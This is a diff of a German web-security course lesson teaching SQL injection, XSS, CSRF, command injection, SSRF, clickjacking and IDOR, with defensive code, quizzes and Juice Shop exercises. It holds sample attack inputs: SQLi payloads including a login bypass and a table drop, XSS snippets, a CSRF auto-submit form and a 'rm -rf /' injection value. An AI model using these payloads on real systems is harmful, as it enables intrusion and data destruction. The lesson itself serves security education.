+        id: 'l5_2', title: 'Web-Angriffe vertieft',
         content: () => `
           <div class="lesson-header animate-in">
             <div class="lesson-tag">Phase 5 · Lektion 2</div>
-            <h1 class="lesson-title">XSS & CSRF — Angriffe auf Webnutzer</h1>
-            <p class="lesson-desc">SQL Injection zielt auf Datenbanken. XSS und CSRF zielen auf die Nutzer selbst — durch ihren eigenen Browser.</p>
+            <h1 class="lesson-title">XSS, CSRF, Injection & Co — die Web-Angriffe im Detail</h1>
+            <p class="lesson-desc">SQL Injection zielt auf die Datenbank. XSS und CSRF zielen auf die Nutzer. Hier lernst du diese Angriffe in der Tiefe — mit echten Beispielen, Defense-Code und Übungen.</p>
           </div>
+
           <div class="content-card animate-in" style="animation-delay:0.05s">
+            <div class="card-label">SQL Injection — die ewige Schwachstelle</div>
+            <div class="explanation">
+              <strong>SQL Injection (SQLi)</strong> wurde 1998 zum ersten Mal beschrieben. Trotzdem ist sie 2026 noch immer in den OWASP Top 10. Warum? Weil immer wieder neue Entwickler in dieselbe Falle tappen: Nutzer-Input direkt in SQL-Strings einbauen.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Wie SQLi funktioniert</span></div>
+              <div class="code-pre"><span class="cm"># SO BAUT MAN ES FALSCH (NIE machen!)</span>
+name = <span class="fn">request</span>.form[<span class="st">"name"</span>]
+query = <span class="st">f"SELECT * FROM users WHERE name='{name}'"</span>
+
+<span class="cm"># Normal-User tippt "Anna" → Query wird:
+#   SELECT * FROM users WHERE name='Anna'
+# Alles OK.
+
+# Angreifer tippt:   ' OR '1'='1
+# Query wird:
+#   SELECT * FROM users WHERE name='' OR '1'='1'
+#                                       └──┬──┘
+#                                       IMMER WAHR
+# → gibt ALLE User zurück</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Was Angreifer damit machen:</strong> Login-Bypass, ganze Tabellen auslesen, Passwort-Hashes klauen, Daten ändern, Daten löschen, manchmal sogar Befehle auf dem Server ausführen.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.07s">
+            <div class="card-label">SQL Injection — Login-Bypass mit einem String</div>
+            <div class="code-block">
+              <div class="code-block-header"><span class="code-lang">Klassischer Angriff</span></div>
+              <div class="code-pre"><span class="cm"># Verwundbarer Login-Code:</span>
+query = <span class="st">f"SELECT * FROM users WHERE name='{n}' AND password='{p}'"</span>
+
+<span class="cm"># Angreifer tippt im Login-Formular:
+#   Name:     admin' --
+#   Passwort: irgendwas
+
+# Query wird zu:
+#   SELECT * FROM users WHERE name='admin' --' AND password='irgendwas'
+#                                          └─┬─┘
+#                                       SQL-Kommentar
+#                                       (alles dahinter wird ignoriert)
+# → loggt als 'admin' ein OHNE Passwort zu kennen</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Andere klassische Payloads:</strong>
+            </div>
+            <div class="code-block" style="margin-top:8px">
+              <div class="code-block-header"><span class="code-lang">SQLi-Payloads (zum Verstehen, nicht missbrauchen)</span></div>
+              <div class="code-pre"><span class="cm">' OR 1=1 --</span>                <span class="cm"># Bedingung immer wahr</span>
+<span class="cm">' UNION SELECT NULL,NULL --</span>  <span class="cm"># Eigene Daten anhängen</span>
+<span class="cm">'; DROP TABLE users; --</span>      <span class="cm"># Tabelle löschen (gestapelte Queries)</span>
+<span class="cm">' OR sleep(10) --</span>            <span class="cm"># Blind SQLi: Server hängt 10s</span></div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.1s">
+            <div class="card-label">SQL Injection — die EINE richtige Lösung</div>
+            <div class="explanation">
+              <strong>Parameterisierte Queries</strong> (auch "Prepared Statements"). Die Datenbank bekommt SQL und Daten <em>getrennt</em> — die Daten werden nie als Code interpretiert.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">python — sicher</span><button class="copy-btn" onclick="copyCode(this)"><i data-lucide="copy"></i>kopieren</button></div>
+              <div class="code-pre"><span class="cm"># SICHER — Platzhalter ?, Werte als Tupel</span>
+cursor.<span class="fn">execute</span>(
+    <span class="st">"SELECT * FROM users WHERE name=? AND password=?"</span>,
+    (name, password)
+)
+
+<span class="cm"># Auch sicher — mit benannten Parametern</span>
+cursor.<span class="fn">execute</span>(
+    <span class="st">"SELECT * FROM users WHERE name=:n"</span>,
+    {<span class="st">"n"</span>: name}
+)
+
+<span class="cm"># Mit ORM (z.B. SQLAlchemy) — automatisch sicher</span>
+User.query.<span class="fn">filter_by</span>(name=name).first()
+
+<span class="cm"># NIEMALS — auch nicht "nur kurz zum Testen":
+# query = f"SELECT * FROM users WHERE id={user_id}"
+# query = "SELECT * FROM users WHERE id=" + str(user_id)
+# query = "SELECT * FROM users WHERE id=%s" % user_id</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Faustregel:</strong> wenn du jemals ein <code>f"..."</code>, <code>+</code>, oder <code>%</code> mit SQL und Variablen siehst — STOP. Da ist eine Injection-Lücke.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.13s">
+            <div class="card-label">Fallbeispiel: TalkTalk-Hack (2015) — 4 Mio Kunden</div>
+            <div class="explanation">
+              <strong>Was passierte:</strong> die britische Telefonfirma TalkTalk wurde durch eine simple SQL-Injection auf einer veralteten Webseite gehackt. <strong>4 Millionen Kunden-Datensätze</strong> wurden gestohlen — Namen, Adressen, Bankdaten.<br><br>
+              <strong>Wer:</strong> ein <strong>17-jähriger Schüler</strong>. Mit kostenlosen Tools, einer Anleitung von YouTube. Es war kein staatlicher Geheimdienst — sondern jemand der mit fertigen Tools auf eine schwache Stelle traf.<br><br>
+              <strong>Folgen:</strong><br>
+              • TalkTalk-Geldstrafe: 400.000 £<br>
+              • Kosten der Aufräumarbeiten: 60 Mio £<br>
+              • 100.000+ Kunden kündigten<br>
+              • Der Junge wurde zu 12 Monaten Jugendstrafe verurteilt<br><br>
+              <strong>Lehre:</strong> du musst kein Genie sein um massiven Schaden anzurichten. Und du musst keine fortgeschrittenen Lücken ausnutzen — eine SQL-Injection von 1998 reicht. Schütze deine Apps.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.16s">
             <div class="card-label">XSS — Cross-Site Scripting</div>
             <div class="explanation">
-              Ein Angreifer schleust JavaScript in eine Seite ein. Andere Besucher führen diesen Code dann im Browser aus — mit allen Rechten des eingeloggten Nutzers.
-            </div>
-            <div class="code-block" style="margin-top:14px">
-              <div class="code-block-header"><span class="code-lang">XSS Beispiel</span></div>
-              <div class="code-pre"><span class="cm"># Verwundbar: Kommentare werden ungefiltert angezeigt</span>
-kommentar = <span class="st">"&lt;script&gt;stehle_cookies()&lt;/script&gt;"</span>
-<span class="cm"># Wird als HTML gerendert → Script läuft bei jedem Besucher</span>
-
-<span class="cm"># Sicher: Eingaben escapen (HTML-Zeichen in Entities umwandeln)</span>
-<span class="kw">import</span> html
-sicher = html.<span class="fn">escape</span>(kommentar)
-<span class="cm"># → &amp;lt;script&amp;gt;stehle_cookies()&amp;lt;/script&amp;gt;</span>
-<span class="cm"># Wird als Text angezeigt, nicht als HTML</span></div>
+              <strong>XSS</strong> ist die zweite große Web-Schwachstelle. Statt SQL einzuschleusen, schleust du <em>JavaScript</em> ein. Wenn andere Nutzer deine Seite besuchen, läuft dein Code in <em>ihrem</em> Browser — mit ihren Rechten.<br><br>
+              Was geht damit?<br>
+              • Cookies und Session-Tokens stehlen → Account-Übernahme<br>
+              • Tastatureingaben mitschneiden (Keylogger)<br>
+              • Die Seite umbauen ("Du wurdest gehackt")<br>
+              • Den Nutzer auf Phishing-Seiten umleiten<br>
+              • Krypto-Mining im Browser des Opfers<br>
+              • Aktionen in Namen des Nutzers ausführen (Posten, Liken, Kaufen, Überweisen)
             </div>
           </div>
-          <div class="content-card animate-in" style="animation-delay:0.08s">
+
+          <div class="content-card animate-in" style="animation-delay:0.19s">
+            <div class="card-label">Die 3 Arten von XSS</div>
+            <div class="code-block">
+              <div class="code-block-header"><span class="code-lang">XSS-Typen</span></div>
+              <div class="code-pre">  REFLECTED XSS    Code in der URL — direkt zurückgespiegelt
+                   Beispiel: Suchseite die "Kein Treffer für X" anzeigt,
+                             und X ungefiltert ausgibt.
+
+                   URL: /suche?q=&lt;script&gt;alert(1)&lt;/script&gt;
+                   Angreifer schickt Opfer einen präparierten Link.
+
+  STORED XSS       Code wird auf dem Server GESPEICHERT
+                   Beispiel: Kommentarfunktion eines Blogs.
+                   Jeder Besucher bekommt den Schadcode automatisch ausgeliefert.
+                   → Gefährlichste Form, kann Massen treffen.
+
+  DOM-BASED XSS    Schwachstelle ist im JavaScript des Frontends
+                   Server hat nichts damit zu tun. Code wie:
+                     document.body.innerHTML = location.hash;
+                   Lädt URL #&lt;img onerror=alert(1)&gt; → führt aus.</div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.22s">
+            <div class="card-label">Fallbeispiel: Samy-Wurm (2005) — der schnellste Wurm aller Zeiten</div>
+            <div class="explanation">
+              <strong>Was passierte:</strong> ein Teenager namens Samy Kamkar fand eine XSS-Lücke auf <strong>MySpace</strong> (damals das größte soziale Netzwerk). Er baute ein <em>JavaScript-Wurm</em>: jeder der sein Profil ansah, fügte ihn automatisch als Freund hinzu und kopierte den Wurm-Code in sein eigenes Profil.<br><br>
+              <strong>Ergebnis:</strong> innerhalb von <strong>20 Stunden</strong> hatte er über 1 Million Freunde — MySpace musste die Seite komplett offline nehmen um den Wurm zu stoppen.<br><br>
+              <strong>Folgen:</strong><br>
+              • Samy bekam 3 Jahre Bewährung + 90 Tage Sozialdienst + 3 Jahre Computer-Verbot<br>
+              • Heute ist er ein anerkannter Sicherheitsforscher<br>
+              • MySpace verlor das Vertrauen der User — einer der Sargnägel<br><br>
+              <strong>Lehre:</strong> XSS in einer Social-Media-Plattform ist katastrophal. Der Schaden skaliert exponentiell wenn der Code andere User infiziert.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.25s">
+            <div class="card-label">XSS — verwundbar vs. sicher (Code-Vergleich)</div>
+            <div class="code-block">
+              <div class="code-block-header"><span class="code-lang">python — Flask/Jinja</span></div>
+              <div class="code-pre"><span class="cm"># SCHLECHT — direkter String-Bau ohne Escaping</span>
+<span class="kw">@app.route</span>(<span class="st">"/hallo"</span>)
+<span class="kw">def</span> <span class="fn">hallo</span>():
+    name = request.args.get(<span class="st">"name"</span>, <span class="st">""</span>)
+    <span class="kw">return</span> <span class="st">f"&lt;h1&gt;Hallo {name}&lt;/h1&gt;"</span>
+<span class="cm"># /hallo?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+# → JavaScript läuft beim Opfer</span>
+
+<span class="cm"># GUT — Template-Engine escaped automatisch</span>
+<span class="kw">return</span> <span class="fn">render_template_string</span>(<span class="st">"&lt;h1&gt;Hallo {{ name }}&lt;/h1&gt;"</span>, name=name)
+<span class="cm"># → "&lt;h1&gt;Hallo &amp;lt;script&amp;gt;..."  als TEXT, nicht als Code</span>
+
+<span class="cm"># Wenn du WIRKLICH HTML brauchst (selten):</span>
+<span class="kw">import</span> bleach   <span class="cm"># sicherer HTML-Sanitizer</span>
+sicher = bleach.<span class="fn">clean</span>(eingabe, tags=[<span class="st">"b"</span>, <span class="st">"i"</span>], strip=<span class="kw">True</span>)</div>
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">javascript — Frontend</span></div>
+              <div class="code-pre"><span class="cm">// SCHLECHT — innerHTML interpretiert HTML</span>
+divEl.innerHTML = userInput;
+<span class="cm">// Wenn userInput = "&lt;img src=x onerror=alert(1)&gt;" → läuft Code</span>
+
+<span class="cm">// GUT — textContent gibt Text als Text aus</span>
+divEl.textContent = userInput;
+
+<span class="cm">// React/Vue: machen das automatisch — solange du nicht
+// dangerouslySetInnerHTML / v-html benutzt</span></div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.28s">
+            <div class="card-label">Content Security Policy (CSP) — die zweite Verteidigungslinie</div>
+            <div class="explanation">
+              Selbst wenn dir mal ein Escape-Bug passiert: <strong>CSP</strong> ist ein HTTP-Header der dem Browser sagt, von welchen Quellen er Skripte laden darf. Ein Angreifer der ein <code>&lt;script src="böse.com"&gt;</code> einschleust, scheitert weil der Browser die Quelle nicht zulässt.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">CSP-Header</span></div>
+              <div class="code-pre"><span class="cm"># Strikte CSP — nur eigene Skripte, kein inline-JS</span>
+<span class="fn">Content-Security-Policy</span>: default-src <span class="st">'self'</span>; script-src <span class="st">'self'</span>;
+
+<span class="cm"># Erlaubt zusätzlich Skripte von einer CDN</span>
+<span class="fn">Content-Security-Policy</span>: script-src <span class="st">'self'</span> https://cdn.jsdelivr.net;
+
+<span class="cm"># In Flask einfach setzen:</span>
+<span class="kw">@app.after_request</span>
+<span class="kw">def</span> <span class="fn">add_csp</span>(response):
+    response.headers[<span class="st">"Content-Security-Policy"</span>] = <span class="st">"default-src 'self'"</span>
+    <span class="kw">return</span> response</div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Defense in Depth:</strong> 1) Eingaben escapen + 2) CSP setzen + 3) HttpOnly-Cookies (siehe Auth-Lektion). Wenn alle drei greifen, ist XSS quasi neutralisiert — selbst wenn dir mal ein Bug durchrutscht.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.31s">
             <div class="card-label">CSRF — Cross-Site Request Forgery</div>
             <div class="explanation">
-              Du bist bei deiner Bank eingeloggt. Du öffnest parallel eine dubiose Seite. Diese Seite macht im Hintergrund eine Anfrage an deine Bank — mit deinem Cookie. Die Bank denkt: "Das ist ja der echte Nutzer" und überweist Geld.<br><br>
-              <strong>Schutz:</strong><br>
-              • CSRF-Tokens — zufälliger Wert der bei jedem Formular mitgeschickt wird<br>
-              • <code>SameSite</code>-Cookies — Cookies werden nicht an fremde Seiten geschickt<br>
-              • Server prüft bei wichtigen Aktionen den <code>Referer</code>-Header
+              <strong>CSRF</strong> ist subtiler als XSS. Du bist bei <code>bank.de</code> eingeloggt (Cookie aktiv). Du öffnest in einem anderen Tab eine harmlose Seite <code>katzen.de</code>. Diese Seite enthält versteckt:
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">CSRF-Angriff</span></div>
+              <div class="code-pre"><span class="cm">&lt;!-- Auf katzen.de versteckt im HTML --&gt;</span>
+<span class="kw">&lt;img</span> <span class="fn">src</span>=<span class="st">"https://bank.de/transfer?to=ANGREIFER&amp;amount=1000"</span>
+     <span class="fn">style</span>=<span class="st">"display:none"</span><span class="kw">&gt;</span>
+
+<span class="cm">&lt;!-- Oder als Formular das automatisch abschickt --&gt;</span>
+<span class="kw">&lt;form</span> <span class="fn">action</span>=<span class="st">"https://bank.de/transfer"</span> <span class="fn">method</span>=<span class="st">"POST"</span> <span class="fn">id</span>=<span class="st">"f"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;input</span> <span class="fn">name</span>=<span class="st">"to"</span> <span class="fn">value</span>=<span class="st">"ANGREIFER"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;input</span> <span class="fn">name</span>=<span class="st">"amount"</span> <span class="fn">value</span>=<span class="st">"1000"</span><span class="kw">&gt;</span>
+<span class="kw">&lt;/form&gt;</span>
+<span class="kw">&lt;script&gt;</span>document.getElementById(<span class="st">"f"</span>).submit()<span class="kw">&lt;/script&gt;</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              Dein Browser schickt die Anfrage an bank.de — und schickt automatisch dein Login-Cookie mit. Die Bank denkt: "Aha, eingeloggter Nutzer will überweisen" und tut's.<br><br>
+              <strong>Du hast nichts angeklickt.</strong> Du hast nur eine Seite besucht.
             </div>
           </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.34s">
+            <div class="card-label">CSRF — Verteidigung in 3 Schichten</div>
+            <div class="explanation">
+              <strong>1. SameSite-Cookie-Attribut</strong> (heute der Standard, vom Browser durchgesetzt):
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">cookie-flag</span></div>
+              <div class="code-pre"><span class="fn">Set-Cookie</span>: session=abc...; <span class="kw">SameSite=Lax</span>; HttpOnly; Secure
+<span class="cm"># SameSite=Lax  — Cookie wird NICHT mitgeschickt bei Cross-Site POST/iframe
+# SameSite=Strict — auch nicht bei normalen Links zu deiner Seite
+# SameSite=None  — kein Schutz (NUR mit Secure-Flag erlaubt)
+# Moderne Browser nutzen Lax als Default — gute Nachricht!</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>2. CSRF-Token</strong> — der Server bettet bei jedem Formular einen zufälligen Token ein, prüft ihn beim Absenden:
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">html — CSRF-Token im Formular</span></div>
+              <div class="code-pre"><span class="kw">&lt;form</span> <span class="fn">method</span>=<span class="st">"POST"</span> <span class="fn">action</span>=<span class="st">"/transfer"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;input</span> <span class="fn">type</span>=<span class="st">"hidden"</span> <span class="fn">name</span>=<span class="st">"csrf_token"</span> <span class="fn">value</span>=<span class="st">"a8f3...XYZ"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;input</span> <span class="fn">name</span>=<span class="st">"amount"</span><span class="kw">&gt;</span>
+  <span class="kw">&lt;button</span> <span class="fn">type</span>=<span class="st">"submit"</span><span class="kw">&gt;</span>Senden<span class="kw">&lt;/button&gt;</span>
+<span class="kw">&lt;/form&gt;</span>
+
+<span class="cm">&lt;!-- Eine fremde Seite kennt diesen zufälligen Token nicht
+     → kann das Formular nicht erfolgreich nachbauen --&gt;</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>3. Frameworks machen das automatisch:</strong><br>
+              • Django, Rails — CSRF-Token sind eingebaut<br>
+              • Flask: <code>flask-wtf</code> mit CSRFProtect<br>
+              • Express: <code>csurf</code><br><br>
+              <strong>Faustregel:</strong> nutze ein modernes Framework + setze SameSite=Lax/Strict. Damit bist du gegen 99% aller CSRF-Angriffe geschützt.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.37s">
+            <div class="card-label">Command Injection — Code statt Daten</div>
+            <div class="explanation">
+              Wenn dein Code mit Shell-Befehlen arbeitet (z.B. ein Bild konvertiert mit ImageMagick), kann ein Angreifer eigene Befehle einschleusen.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">python — gefährlich</span></div>
+              <div class="code-pre"><span class="cm"># SCHLECHT — User-Input in Shell-Befehl</span>
+<span class="kw">import</span> os
+filename = request.form[<span class="st">"file"</span>]
+os.<span class="fn">system</span>(<span class="st">f"convert {filename} thumb.jpg"</span>)
+
+<span class="cm"># Angreifer schickt: "foto.jpg; rm -rf /"
+# Wird zu:           convert foto.jpg; rm -rf / thumb.jpg
+# → System weg.
+
+# GUT — subprocess mit Liste (keine Shell-Interpretation)</span>
+<span class="kw">import</span> subprocess
+subprocess.<span class="fn">run</span>([<span class="st">"convert"</span>, filename, <span class="st">"thumb.jpg"</span>], shell=<span class="kw">False</span>)
+<span class="cm"># filename wird wörtlich übergeben, kein Shell-Parsing</span></div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.4s">
+            <div class="card-label">SSRF — Server-Side Request Forgery</div>
+            <div class="explanation">
+              Klassischer Fall: deine App lädt für den Nutzer ein Bild von einer URL. Was wenn der Nutzer als URL <code>http://localhost:6379/</code> angibt? Dann fragt dein Server seine eigene <em>interne</em> Redis-Datenbank an — und gibt die Antwort an den Angreifer zurück.<br><br>
+              <strong>Berühmt:</strong> SSRF war die Hauptlücke beim <strong>Capital-One-Hack 2019</strong> — 100 Millionen Kreditkarten-Anträge geleakt. Eine SSRF-Lücke erlaubte, AWS-Metadaten-API zu erreichen → Cloud-Credentials klauen → Daten exfiltrieren.<br><br>
+              <strong>Schutz:</strong><br>
+              • URL-Whitelist (nur https://-URLs zu erlaubten Hosts)<br>
+              • IP-Blacklist (keine internen IPs: 127.x, 10.x, 192.168.x, 169.254.x)<br>
+              • DNS-Resolution prüfen (manche Lücken nutzen DNS-Tricks um Filter zu umgehen)
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.43s">
+            <div class="card-label">Clickjacking — du klickst auf etwas anderes als du denkst</div>
+            <div class="explanation">
+              Eine bösartige Seite lädt deine echte Seite (z.B. Facebook) in einem unsichtbaren <code>&lt;iframe&gt;</code> und legt darüber einen Köder ("Du hast 1.000€ gewonnen — klick hier!"). Du klickst auf den Köder — der Klick geht aber an den unsichtbaren "Like"- oder "Senden"-Knopf.<br><br>
+              <strong>Schutz</strong> ist trivial — den HTTP-Header setzen:
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">HTTP-Header</span></div>
+              <div class="code-pre"><span class="fn">X-Frame-Options</span>: DENY            <span class="cm"># nie in iframe einbettbar</span>
+<span class="fn">X-Frame-Options</span>: SAMEORIGIN      <span class="cm"># nur eigene Domain darf</span>
+
+<span class="cm"># Modernere Variante über CSP:</span>
+<span class="fn">Content-Security-Policy</span>: frame-ancestors <span class="st">'none'</span>;</div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.46s">
+            <div class="card-label">IDOR — Insecure Direct Object Reference</div>
+            <div class="explanation">
+              Eine der häufigsten Lücken in echten Apps. Beispiel:
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">IDOR — verwundbar</span></div>
+              <div class="code-pre"><span class="cm"># Nutzer ruft auf: GET /api/rechnung/12345</span>
+<span class="kw">@app.route</span>(<span class="st">"/api/rechnung/&lt;int:id&gt;"</span>)
+<span class="kw">def</span> <span class="fn">rechnung</span>(id):
+    <span class="kw">return</span> db.rechnungen.<span class="fn">get</span>(id)
+
+<span class="cm"># Problem: KEINE Prüfung ob die Rechnung dem User gehört!
+# Angreifer ändert URL zu /api/rechnung/12346 → fremde Rechnung.</span>
+
+<span class="cm"># SICHER:</span>
+<span class="kw">@app.route</span>(<span class="st">"/api/rechnung/&lt;int:id&gt;"</span>)
+<span class="kw">def</span> <span class="fn">rechnung</span>(id):
+    r = db.rechnungen.<span class="fn">get</span>(id)
+    <span class="kw">if</span> r.user_id != current_user.id:
+        <span class="kw">return</span> <span class="st">"forbidden"</span>, <span class="num">403</span>
+    <span class="kw">return</span> r</div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Berühmtes Beispiel:</strong> 2014 leakte Snapchat 4,6 Mio Nutzerdaten via IDOR — eine API-URL gab Username + Telefonnummer zurück, ohne zu prüfen wer fragte.<br><br>
+              <strong>Tipp:</strong> nutze unguessbare IDs (UUIDs statt sequenzieller Zahlen) als zusätzliche Sicherheit — aber verlasse dich NIEMALS allein darauf. Authorisierung MUSS immer im Code geprüft werden.
+            </div>
+          </div>
+
           ${quiz('q_sec1', 'Was ist der beste Schutz gegen XSS?', [
-            {t:'Alle Eingaben escapen bevor sie als HTML ausgegeben werden', correct:true, why:'Richtig! html.escape(), textContent statt innerHTML — je nach Sprache. Niemals ungefilterten Nutzer-Input als HTML rendern.'},
+            {t:'Alle Eingaben escapen bevor sie als HTML ausgegeben werden', correct:true, why:'Richtig! html.escape(), textContent statt innerHTML — je nach Sprache. Niemals ungefilterten Nutzer-Input als HTML rendern. Plus CSP als zweite Schicht.'},
             {t:'Den Browser abschalten', correct:false, why:'Das ist keine ernsthafte Lösung.'},
             {t:'Nur sichere Browser benutzen', correct:false, why:'XSS läuft in JEDEM Browser — das Problem liegt am Server, nicht am Browser.'},
             {t:'HTTPS benutzen', correct:false, why:'HTTPS schützt gegen Abhören, nicht gegen XSS. Wichtig, aber hilft hier nicht.'},
           ])}
+          ${quiz('q_sec2', 'Wie verhinderst du SQL Injection zuverlässig?', [
+            {t:'Nutzer-Input in Anführungszeichen einrahmen', correct:false, why:'Sehr unsicher — Angreifer setzen einfach selbst Anführungszeichen rein.'},
+            {t:'Parameterisierte Queries / Prepared Statements', correct:true, why:'Genau! Die EINE richtige Lösung. Daten und Code werden getrennt — der Datenbank-Treiber kümmert sich um sicheres Einsetzen.'},
+            {t:'Eingaben mit replace() filtern', correct:false, why:'Filter sind fragil — Angreifer finden immer Umgehungen (Encoding, Doppelung, Unicode-Tricks). Parameter-Queries sind die robuste Lösung.'},
+            {t:'Eine Firewall davor stellen', correct:false, why:'WAFs helfen oberflächlich, aber verhindern SQLi nicht zuverlässig. Die Lösung gehört in den Code.'},
+          ])}
+          ${quiz('q_sec3', 'Was ist der Unterschied zwischen Reflected und Stored XSS?', [
+            {t:'Reflected ist aus dem Cache, Stored ist live', correct:false, why:'Hat nichts mit Caching zu tun.'},
+            {t:'Reflected: Code in URL, einmalig pro Opfer. Stored: Code wird in DB gespeichert, trifft alle Besucher', correct:true, why:'Genau! Stored ist gefährlicher weil es viral skaliert (siehe Samy-Wurm). Reflected braucht einen präparierten Link.'},
+            {t:'Reflected ist ein Server-Bug, Stored ein Client-Bug', correct:false, why:'Beide können Server- ODER Client-seitig sein.'},
+            {t:'Kein Unterschied', correct:false, why:'Es gibt einen wichtigen Unterschied — siehe oben.'},
+          ])}
+          ${quiz('q_sec4', 'Welcher Cookie-Flag schützt am besten gegen CSRF?', [
+            {t:'HttpOnly', correct:false, why:'HttpOnly schützt gegen XSS-Klau (JavaScript kann das Cookie nicht lesen) — nicht gegen CSRF.'},
+            {t:'Secure', correct:false, why:'Secure sorgt nur dafür, dass das Cookie nur über HTTPS gesendet wird — nicht CSRF-Schutz.'},
+            {t:'SameSite=Lax oder Strict', correct:true, why:'Genau! SameSite verhindert dass das Cookie bei Cross-Site-Requests mitgeschickt wird. Moderne Browser haben Lax als Default — gute Nachricht.'},
+            {t:'Domain', correct:false, why:'Domain bestimmt welche Subdomains das Cookie bekommen — nichts mit CSRF zu tun.'},
+          ])}
+          ${quiz('q_sec5', 'Was ist eine IDOR-Schwachstelle?', [
+            {t:'Wenn die DB-IDs zu lang sind', correct:false, why:'Hat nichts mit Länge zu tun.'},
+            {t:'Wenn der Server Berechtigung nicht prüft und User durch URL-Manipulation auf fremde Daten zugreift', correct:true, why:'Genau! Insecure Direct Object Reference — z.B. /rechnung/123 ändern zu /rechnung/124. Lösung: bei JEDER Anfrage prüfen ob die Ressource dem User gehört.'},
+            {t:'Wenn die URL Sonderzeichen enthält', correct:false, why:'Sonderzeichen sind ein anderes Problem (oft Encoding).'},
+            {t:'Wenn Sessions zu lange aktiv sind', correct:false, why:'Das wäre Session-Fixation oder ähnliches — andere Schwachstellen.'},
+          ])}
+
+          <div class="boss-card animate-in" style="animation-delay:0.5s">
+            <div class="boss-label-text"><i data-lucide="sparkles"></i>Praxisaufgaben</div>
+            <div class="boss-title">Web-Schwachstellen finden & verstehen</div>
+            <div class="boss-desc">
+              <strong>1.</strong> Starte <strong>OWASP Juice Shop</strong> lokal: <code>docker run -p 3000:3000 bkimminich/juice-shop</code> — die App ist absichtlich verwundbar.<br><br>
+              <strong>2.</strong> Versuche zu erreichen:<br>
+              &nbsp;&nbsp;• Login als Admin per SQL Injection (Tipp: <code>' OR 1=1 --</code> beim Email-Feld)<br>
+              &nbsp;&nbsp;• Hinterlasse einen Kommentar mit XSS<br>
+              &nbsp;&nbsp;• Finde via IDOR fremde Bestellungen<br><br>
+              <strong>3.</strong> Schau auf <code>portswigger.net/web-security/all-labs</code> — alle Labs sind kostenlos. Mach 3 SQL-Injection-Labs.<br><br>
+              <strong>4.</strong> Installiere <strong>Burp Suite Community</strong> + Browser-Proxy. Klicke dich durch eine Seite und schau wie HTTP-Anfragen aussehen.<br><br>
+              <strong>5.</strong> Bau in deinem eigenen Flask-Projekt ein verwundbares Login. Beobachte die Lücke. Dann fixe sie mit parameterisierten Queries. <em>Lerneffekt: tausendmal größer als nur Theorie zu lesen.</em><br><br>
+              <strong>WARNUNG:</strong> wende NICHTS davon auf fremde Webseiten an. Auch nicht "kurz zum Spaß". Das Hacken einer Behörde landest dich vor Gericht — auch als 17-Jähriger.
+            </div>
+          </div>
         `
       },
       {
@@ -5254,50 +5977,366 @@ sicher = html.<span class="fn">escape</span>(kommentar)
         content: () => `
           <div class="lesson-header animate-in">
             <div class="lesson-tag">Phase 5 · Lektion 3</div>
-            <h1 class="lesson-title">Passwörter richtig speichern</h1>
-            <p class="lesson-desc">Wenn du als Entwickler Passwörter im Klartext speicherst, bist du unvermeidlich für den nächsten großen Datenleak verantwortlich. Hier lernst du wie man es RICHTIG macht.</p>
+            <h1 class="lesson-title">Passwörter, Hashing & Account-Sicherheit</h1>
+            <p class="lesson-desc">Passwörter sind das schwächste Glied der IT-Sicherheit — und gleichzeitig allgegenwärtig. Hier lernst du wie sie geknackt werden, wie du sie richtig speicherst, und wie die Zukunft danach aussieht.</p>
           </div>
+
           <div class="content-card animate-in" style="animation-delay:0.05s">
-            <div class="card-label">Hash vs. Verschlüsselung</div>
+            <div class="card-label">Wie Passwörter wirklich geleakt werden</div>
             <div class="explanation">
-              <strong>Verschlüsselung</strong> — rückwärts machbar (mit Key). Für Nachrichten die der Empfänger lesen soll.<br><br>
-              <strong>Hash</strong> — Einweg-Funktion. Aus "geheim123" wird <code>$2b$12$abc...</code>. Kein Weg zurück.<br><br>
-              Passwörter werden <strong>gehasht</strong>, nicht verschlüsselt. Selbst der Server kennt dein Passwort nicht — er vergleicht nur den Hash.
